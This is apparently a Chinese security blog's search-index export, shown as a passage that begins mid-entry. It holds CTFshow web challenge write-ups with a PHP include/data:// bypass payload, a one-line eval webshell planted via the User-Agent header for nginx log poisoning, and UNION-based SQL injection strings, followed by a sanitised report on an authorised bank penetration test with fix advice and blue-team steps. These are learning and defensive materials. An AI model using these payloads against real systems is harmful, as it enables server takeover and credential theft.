运行<code>system(&#39;ls&#39;)</code></li></ol><p>绕过后的payload:<code>url/?c=include%0a$_GET[1]?&gt;&amp;1=data://text/plain/,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>同web32，重点再写一遍<strong>一句话木马</strong>，并尝试用蚁剑连接。</p><p><img src="/images/web33.png"></p><ol><li><p>url加上&#x2F;index.php(嫌麻烦可以跳过)</p></li><li><p>post传参a&#x3D;1(a不要与题目中参数一样)</p></li><li><p>抓包</p></li><li><p>UA头加上**<code>&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;</code>**</p></li><li><p>index.php改为实际路径，如&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure></li><li><p>也可以用<strong>c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>来绕过waf。</p></li><li><p>post参数改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">shell=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ol><p>发包发现已经得到想要的结果。</p><p><img src="/images/%E8%9A%81%E5%89%911.png"></p><p><img src="/images/%E8%9A%81%E5%89%912.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2025/01/02/%E6%B5%8B%E8%AF%95%EF%BC%88%E5%9B%BE%E7%89%87%EF%BC%89/"/>
    <url>/2025/01/02/%E6%B5%8B%E8%AF%95%EF%BC%88%E5%9B%BE%E7%89%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="无过滤注入"><a href="#无过滤注入" class="headerlink" title="无过滤注入"></a>无过滤注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p><img src="/images/web171.jpg"></p><ol><li><strong>闭合单引号</strong>：通过输入<code>&#39;</code>闭合id参数的单引号。</li><li><strong>注入UNION查询</strong>：使用<code>UNION SELECT</code>获取其他数据，确保列数与原查询一致。</li><li><strong>绕过原查询条件</strong>：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的<code>username != &#39;flag&#39;</code>限制。</li><li><strong>注释剩余部分</strong>：使用<code>--</code>注释掉原SQL的剩余部分，避免语法错误。</li></ol><p>观察到有三列，两种解发均可，后者会带出id&#x3D;1的那一行，没啥作用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select username,password,1 from ctfshow_user where username=&#x27;</span>flag<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p> <strong>注释符的区别</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2024国家护网</title>
    <link href="/2024/08/24/2024%E5%9B%BD%E5%AE%B6%E6%8A%A4%E7%BD%91/"/>
    <url>/2024/08/24/2024%E5%9B%BD%E5%AE%B6%E6%8A%A4%E7%BD%91/</url>
    
    <content type="html"><![CDATA[<h1 id="前言部分"><a href="#前言部分" class="headerlink" title="前言部分"></a>前言部分</h1><h2 id="0-项目背景与目标"><a href="#0-项目背景与目标" class="headerlink" title="0.项目背景与目标"></a>0.项目背景与目标</h2><p>2024国护开始，在北京奇安信，国家xx银行驻场。护网前先是进行了渗透测试，这篇blog进行详细的叙述。</p><h3 id="郑重说明"><a href="#郑重说明" class="headerlink" title="郑重说明"></a>郑重说明</h3><p>本次测试为完全授权的合法合规测试。<br>文中涉及目标均为”某银行”代称，严格脱敏。<br>不会透露内部数据信息，目的在于分享方法论，过程，共性问题与防护思路。</p><h1 id="测试过程及方法论"><a href="#测试过程及方法论" class="headerlink" title="测试过程及方法论"></a>测试过程及方法论</h1><h2 id="1-漏洞扫描结果"><a href="#1-漏洞扫描结果" class="headerlink" title="1.漏洞扫描结果"></a>1.漏洞扫描结果</h2><p>包括但不限于应用漏洞，系统漏洞以及弱口令等常见安全隐患。本次共发现漏洞77个：高危漏洞0个，中危漏洞8个，低危漏洞69个。研判后确定存在高危0个，中危5个</p><h2 id="2-漏洞类型"><a href="#2-漏洞类型" class="headerlink" title="2.漏洞类型"></a>2.漏洞类型</h2><ul><li>Access-Control_Allow-Origin设置不当－低危</li><li>Cookie未开启HttpOnly－低危</li><li>Cookie未开启Secure－低危</li><li>Host头欺骗攻击－中危</li><li>Webpack Sourcemap文件泄露漏洞－低危</li><li>常见管理接口(正常登录界面)－中危</li><li>密码表单传输未加密－中危</li><li>疑似文件上传点－低危</li><li>发现Robots.txt－低危</li></ul><h2 id="关于“Host头欺骗攻击”漏洞"><a href="#关于“Host头欺骗攻击”漏洞" class="headerlink" title="关于“Host头欺骗攻击”漏洞"></a>关于“Host头欺骗攻击”漏洞</h2><ol><li>漏洞描述:<br>开发人员为方便获取网站域名，常依赖HTTP协议的Host头，如在php代码中可用$_SERVER[“HTTP_HOST”]获取。但实际中该头由客户端控制，不可信，若应用程序未正确处理，可能导致恶意代码传入。</li><li>修复建议:<br>不处理客户端传入的Host头信息，或者使用前进行白名单检查。</li></ol><h2 id="关于“Webpack-Sourcemap文件泄露”漏洞"><a href="#关于“Webpack-Sourcemap文件泄露”漏洞" class="headerlink" title="关于“Webpack Sourcemap文件泄露”漏洞"></a>关于“Webpack Sourcemap文件泄露”漏洞</h2><ol><li>漏洞背景</li></ol><ul><li>Webpack：是前端常用的打包工具，能把一堆零散的前端代码（像 Vue 写的组件、JS 逻辑等）打包成几个文件，方便网站运行 。</li><li>Sourcemap：就像“代码地图”，原本打包后代码会被压缩、混淆，有了它，出问题时能顺着“地图”找到原始代码位置，方便开发调试 。但要是泄露出去，就会把原始代码暴露给外人 。</li></ul><ol start="2"><li>漏洞情况<br>因为网站用 Webpack 打包时，配置没弄好，导致.js.map这类Sourcemap文件能被外人通过网络请求拿到 。一旦被拿到，里面可能藏着：</li></ol><ul><li>API 信息：比如系统里调用哪些后台接口，知道了可能仿造请求搞破坏 。</li><li>加密算法</li><li>管理员邮箱：知道了可能给管理员发钓鱼邮件，骗他们泄露更重要的账号密码 。</li><li>内部功能<br>GET &#x2F;coremail&#x2F;bundle&#x2F;polyfill.e5a03.js HTTP&#x2F;1.1这类请求，就是在尝试找能拿到Sourcemap文件的入口。</li></ul><ol start="3"><li>修复</li></ol><ul><li>改配置：找到项目里config&#x2F;index.js文件，把productionSourceMap改成  false  。这样正式环境（用户访问的环境）就不会生成 Sourcemap 文件，从源头减少泄露可能 。</li><li>删文件：把正式环境里已经存在的.js.map文件都删掉或者设置成不让外人访问 。这样就算之前有残留，也不会被拿到了 。<br>简单说，就是网站因为前端打包配置问题，暴露了能让别人拿到原始代码、敏感信息的“地图文件”，按修复建议改配置、删文件，就能堵住这个安全窟窿。</li></ul><h2 id="关于“疑似文件上传”漏洞"><a href="#关于“疑似文件上传”漏洞" class="headerlink" title="关于“疑似文件上传”漏洞"></a>关于“疑似文件上传”漏洞</h2><ol><li><p>漏洞描述：<br>检测到应用表单&#x2F;脚本里有文件上传表单或代码，存在文件上传点。若 Web 应用处理文件上传时，路径、文件名、扩展名可被用户控制，攻击者可能上传脚本木马，控制服务器</p></li><li><p>请求包：<br>包含  GET &#x2F;coremail&#x2F;bundle&#x2F;e5a03.js HTTP&#x2F;1.1  等请求头（Host、Accept - Encoding 等 ）</p></li><li><p>输出研判：<br>发现  <input type="file" name="upfilg" class="uploadfile" size="1" accept="{}" multiple="true" />  上传控件</p></li><li><p>修复建议：<br>检查上传文件扩展名白名单；上传路径、文件名不用用户可控数据；上传目录不提供脚本解析；图片上传先处理（转码、缩略、水印等 ）再保存 ，以此防范文件上传漏洞带来的服务器被入侵风险 。</p></li></ol><h1 id="利用waf检测"><a href="#利用waf检测" class="headerlink" title="利用waf检测"></a>利用waf检测</h1><p>尝试用命令注入攻击<br><img src="/images/2024%E5%9B%BD%E6%8A%A41.jpg"></p><p><img src="/images/2024%E5%9B%BD%E6%8A%A42.jpg"></p><p><img src="/images/2024%E5%9B%BD%E6%8A%A43.jpg"></p><h1 id="蓝队实战"><a href="#蓝队实战" class="headerlink" title="蓝队实战"></a>蓝队实战</h1><p><img src="/images/2024%E5%9B%BD%E6%8A%A44.jpg"></p><ul><li>确认威胁详情：查看每个威胁名称，了解其具体含义，如  TCP_Kerberos_横向移动_横向工具转移，涉及到 Kerberos 协议的横向移动风险，明确攻击者可能的意图和攻击方式 。</li><li>查看威胁级别：区分高、中、低危告警，优先处理像  HTTP_文件操作攻击_SiteServer  这类高危告警，因为它们对系统安全的威胁更大。</li></ul><ol><li>直接在防火墙，路由器封ip</li><li>看被攻击的目的ip(服务器)，临时加强防御</li><li>看日志，找是否是内网电脑中病毒</li><li>针对nmap，把不常用的端口关闭，更新，打补丁</li><li>文件上传限制文件内容，如过滤php等</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
